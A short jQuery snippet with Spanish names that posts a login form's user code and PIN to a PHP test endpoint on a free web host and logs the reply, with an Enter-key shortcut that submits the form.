function enviar() {
	var usuario = $('#user').val();
	var password = $('#pass').val();
	//alert(usuario+" "+password);
	$.post("https://dcc.000webhostapp.com/pruebaLogin.php", {codigo: usuario, nip: password}, function(result,status){
		console.log(result);
	});
}

$(document).keypress(function(e){
	if(e.which == 13)
		if($('#user').val() != "" && $('#pass').val() != "")
			$("#enviar").click();
});